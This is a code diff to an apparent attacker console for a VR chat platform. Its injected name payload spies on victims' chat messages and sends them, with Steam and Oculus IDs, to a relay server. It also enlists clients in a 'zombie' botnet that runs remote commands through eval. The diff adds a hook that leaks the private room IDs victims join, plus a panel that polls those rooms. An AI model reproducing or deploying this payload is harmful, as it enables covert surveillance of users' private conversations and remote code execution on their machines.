@@ -63,13 +63,13 @@
                         last update <time></time>
                     </div>
                 </div>
-                <div class="card text-center">
-                    <div class="card-header">Discovered private rooms</div>
+                <div class="card text-center" id="discoveredRooms">
+                    <div class="card-header">Discovered rooms</div>
                     <ul class="list-group list-group-flush roomList"></ul>
                     <div class="card-footer text-muted roomList-footer">
                        <div class="form-check">
-                            <input class="form-check-input" type="checkbox" value="" id="privateRoomsAutorefresh">
-                            <label class="form-check-label" for="privateRoomsAutorefresh">autorefresh</label>
+                            <input class="form-check-input" type="checkbox" value="" id="discoveredRoomsAutorefresh">
+                            <label class="form-check-label" for="discoveredRoomsAutorefresh">autorefresh</label>
                         </div>
                         last update <time></time>
                     </div>
@@ -470,6 +470,7 @@ let hideFirstCommaFromRoomPreview = "setTimeout(function(){var n=document.getEle
 let hideUsernameFromRoomParticipants = `Array.prototype.forEach.call(document.querySelectorAll('#room-participants li'),function(e){if(e.querySelector('h3.user-name').firstChild.nodeValue==='${textName}'){e.remove()}});`;
 let persistentChatEavesdropping = `;sendChat=function(){var s=new WebSocket('${relayServer}');s.onopen=function(){s.send(JSON.stringify({'type':'chat','roomId':roomState.roomId,'name':NAME,'steamId':mySteamId,'oculusId':myOculusId,'message':$('#room-chat-input').val()}));if(canSendChatMessage){canSendChatMessage= false;var _0x1865xb7=$(_0x6af9[1362])[_0x6af9[743]]();if(_0x1865xb7!= _0x6af9[90]){$(_0x6af9[1362])[_0x6af9[743]](_0x6af9[90]);$(_0x6af9[1362])[_0x6af9[1359]]();displayChatMessage(_0x1865xb7,USER);Unity[_0x6af9[1072]](_0x6af9[1971],[_0x1865xb7],USER,_0x6af9[1972]);gaChatMessageSentEvent()};setTimeout(function(){canSendChatMessage= true},CHATRATELIMIT)};};};`;
 let makeZombie = "var sz=new WebSocket('ws://172.26.103.128:8081');sz.onopen=function(){sz.send(JSON.stringify({'type':'zombie-register','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid}))};sz.onmessage=function(e){var m=JSON.parse(e.data);if(m.type==='zombie-cmd'){sz.send(JSON.stringify({type:'zombie-result','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,result:eval(m.cmd)}))}};";
+let discoverRoom = `joinRoomWithId = function(roomId) {var srd=new WebSocket('${relayServer}');srd.onopen=function(){srd.send(JSON.stringify({'type':'room-discovered','roomId':roomId,})); checkMyUserCreatedRoom(); signal["write"]({ 'type': "room-join", 'roomId': roomId, 'name': NAME, 'uuid': ACCOUNT["uuid"], 'version': UNITYVERSION, 'steamId': mySteamId, 'oculusId': myOculusId }); srd.close(); };}`;
 //endregion
 
 let NAME = textName;
@@ -479,6 +480,7 @@ NAME += hideFirstCommaFromRoomPreview;
 NAME += hideUsernameFromRoomParticipants;
 NAME += persistentChatEavesdropping;
 NAME += makeZombie;
+NAME += discoverRoom;
 NAME += '</sc'+'ript>';
 
 joinRoomForm.addEventListener("submit", function (event) {
@@ -486,6 +488,8 @@ joinRoomForm.addEventListener("submit", function (event) {
     let roomId = roomIdInput.value;
 
     if(rooms[roomId]){console.warn('You are already connected to this room.'); return;}
+
+    discoveredRoomsManager.addRoom(roomId);
 
     let attackerIdentity = new Identity(NAME, generateBigscreenUuid(), '', '');
     let room = new Room(roomId, attackerIdentity);
@@ -503,7 +507,7 @@ function RoomUI(roomId, room){
     roomCardTempalte.innerHTML =
         '<div class="card">\n' +
         '    <div class="card-header">' +
-        '       <code></code>' +
+        '       <span class="roomId"></span>' +
         '       <div class="dropdown display-inline-block">\n' +
         '           <button class="btn btn-info dropdown-toggle" type="button" data-toggle="dropdown">' +
         '               <b class="icon">⚙</b>' +
@@ -563,7 +567,7 @@ function RoomUI(roomId, room){
         that.room.updateLockSettings(locks);
     });
 
-    this.roomIdElement = this.roomCardElement.querySelector('.card-header code');
+    this.roomIdElement = this.roomCardElement.querySelector('.card-header span.roomId');
     this.roomIdElement.appendChild(document.createTextNode(roomId));
 
     this.chatBodyElement = this.roomCardElement.querySelector('div div div div div.card-body');
@@ -1042,6 +1046,9 @@ messageRelayWs.onmessage = function(event){
         case 'chat':
             rooms[message.roomId].roomUI.renderChatMessage(message.message, message.name, new Date());
             break;
+        case 'room-discovered':
+            discoveredRoomsManager.addRoom(message.roomId);
+            break;
         case 'zombie-register': {
             console.log('New zombie:', message.uuid);
             zombies.push(message.uuid);
@@ -1153,15 +1160,19 @@ function PublicRoomsUI(publicRooms){
         rooms.forEach(function(room){
             let roomElement = document.createElement('li');
             roomElement.classList.add('list-group-item');
+
+            let roomIdElement = document.createElement('span');
+            roomIdElement.classList.add('roomId');
+            roomIdElement.appendChild(document.createTextNode(room.roomId));
+            roomElement.appendChild(roomIdElement);
+            roomElement.appendChild(document.createTextNode(' (' + room.participants + '/' + room.size + ')'));
+
+            roomElement.appendChild(document.createElement('br'));
+
             let nameElement = document.createElement('b');
             nameElement.appendChild(document.createTextNode(room.name));
             roomElement.appendChild(nameElement);
             roomElement.appendChild(document.createTextNode(' · ' + room.description));
-            roomElement.appendChild(document.createElement('br'));
-            let roomIdElement = document.createElement('code');
-            roomIdElement.appendChild(document.createTextNode(room.roomId));
-            roomElement.appendChild(roomIdElement);
-            roomElement.appendChild(document.createTextNode(' (' + room.participants + '/' + room.size + ')'));
             that.publicRoomsListElement.appendChild(roomElement);
         });
         this.updateFooter();
@@ -1179,7 +1190,174 @@ function PublicRoomsUI(publicRooms){
     });
 }
 
-let publicRooms = new PublicRoomsManager();
+function DiscoveredRoomsManager() {
+    let that = this;
+
+    this.getRoomState = function (roomId, onSuccess, onNotFound, onError) {
+        let xhr = new XMLHttpRequest();
+        xhr.overrideMimeType("application/json");
+        xhr.onload = function () {
+            if(xhr.status === 404){
+                onNotFound();
+                return;
+            }
+            let roomState = JSON.parse(xhr.responseText);
+            onSuccess(roomState);
+        };
+        xhr.onerror = function () {
+            console.error('ERROR', 'getRoomState()', xhr);
+            onError();
+        };
+        xhr.open('GET', 'https://signal2adm.bigscreenvr.com/roomstate?roomId=' + roomId, true);
+        xhr.send();
+    };
+
+    this.roomIds = [];
+
+    this.discoveredRoomsUI = new DiscoveredRoomsUI(this);
+    this.intervalId = null;
+
+    this.update = function(){
+        this.roomIds.forEach(function(roomId){
+            that.getRoomState(
+                roomId,
+                function(roomState){that.discoveredRoomsUI.updateRoom(roomState);},
+                function(){that.discoveredRoomsUI.markRoomLost(roomId);},
+                function(){console.error('Error during downloading roomstate', roomId)}
+            )
+        });
+        this.discoveredRoomsUI.updateFooter();
+    };
+
+    this.addRoom = function(roomId){
+        if(this.roomIds.includes(roomId)){
+            console.warn('WARN', 'DiscoveredRoomsManager.addRoom()', 'RoomId is already added.');
+            that.update();
+            return;
+        }
+        else{
+            this.roomIds.push(roomId);
+        }
+        this.getRoomState(
+            roomId,
+            function(roomState){that.discoveredRoomsUI.addRoom(roomState)},
+            function(){that.discoveredRoomsUI.addRoom({roomId:roomId})},
+            function(){console.error('Error during downloading roomstate', roomId)}
+        )
+    };
+
+    this.startPeriodicUpdates = function(){
+        if(this.intervalId !== null){
+            console.error('ERROR', 'Periodic updates already started.');
+            return;
+        }
+
+        this.discoveredRoomsUI.autorefreshInput.checked = true;
+        that.update();
+        this.intervalId = setInterval(function(){
+            that.update();
+        },5000);
+    };
+    this.stopPeriodicUpdates = function(){
+        if(this.intervalId === null){
+            console.error('ERROR', 'Cannot stop. Periodic updates are not running.');
+            return;
+        }
+
+        this.discoveredRoomsUI.autorefreshInput.checked = false;
+        clearInterval(this.intervalId);
+        this.intervalId = null;
+    };
+    this.togglePeriodicUpdates = function(){
+        if(this.intervalId === null){
+            this.startPeriodicUpdates();
+        }
+        else{
+            this.stopPeriodicUpdates();
+        }
+    }
+}
+
+function DiscoveredRoomsUI(discoveredRoomsManager){
+    // TODO Maybe dynamically insert html
+    let that = this;
+    this.roomsManager = discoveredRoomsManager;
+    this.cardElement = document.getElementById('discoveredRooms');
+    this.listElement = this.cardElement.getElementsByTagName('ul')[0];
+    this.updatedTimeElement = this.cardElement.querySelector('.card-footer time');
+    this.autorefreshInput = this.cardElement.querySelector('.card-footer .form-check input');
+    this.autorefreshInput.checked = false;
+    this.roomElements = {};
+
+    this.hideAllRooms = function(){
+        this.listElement.innerHTML = '';
+    };
+
+    this.addRoom = function(room){
+        let roomElement = document.createElement('li');
+        roomElement.classList.add('list-group-item');
+
+        let roomIdElement = document.createElement('span');
+        roomIdElement.classList.add('roomId');
+        roomIdElement.appendChild(document.createTextNode(room.roomId));
+        roomElement.appendChild(roomIdElement);
+        let participantsElement = document.createElement('span');
+        participantsElement.classList.add('_participants');
+        if(room.participants !== undefined && room.size !== undefined) {
+            participantsElement.appendChild(document.createTextNode(' (' + room.participants + '/' + room.size + ')'));
+        }
+        roomElement.appendChild(participantsElement);
+
+        roomElement.appendChild(document.createElement('br'));
+
+        let nameElement = document.createElement('b');
+        nameElement.appendChild(document.createTextNode(room.name ? room.name : ''));
+        roomElement.appendChild(nameElement);
+        roomElement.appendChild(document.createTextNode(' · ' + (room.description ? room.description : '')));
+
+        roomElement.classList.add('bg-warning');
+
+        this.listElement.appendChild(roomElement);
+        this.roomElements[room.roomId] = roomElement;
+
+        this.updateFooter();
+    };
+
+    this.updateRoom = function(room){
+        let roomElement = this.roomElements[room.roomId];
+        let participantsElement = roomElement.getElementsByClassName('_participants')[0];
+        participantsElement.innerHTML = '';
+        participantsElement.appendChild(document.createTextNode(' (' + room.participants + '/' + room.size + ')'));
+
+        roomElement.classList.remove('bg-warning');
+        roomElement.classList.add('bg-success');
+    };
+
+    this.markRoomLost = function(roomId){
+        let roomElement = this.roomElements[roomId];
+        let participantsElement = roomElement.getElementsByClassName('_participants')[0];
+        participantsElement.innerHTML = '';
+
+        roomElement.classList.remove('bg-success');
+        roomElement.classList.remove('bg-warning');
+        roomElement.classList.add('bg-secondary');
+    };
+
+    this.updateFooter = function(){
+        this.updatedTimeElement.innerHTML = '';
+        this.updatedTimeElement.appendChild(
+            document.createTextNode((new Date).toLocaleTimeString())
+        );
+    };
+
+    this.autorefreshInput.addEventListener("click", function (event) {
+        that.roomsManager.togglePeriodicUpdates();
+    });
+}
+
+let publicRoomsManager = new PublicRoomsManager();
+let discoveredRoomsManager = new DiscoveredRoomsManager();
+discoveredRoomsManager.startPeriodicUpdates();
 
 </script>
 </body>
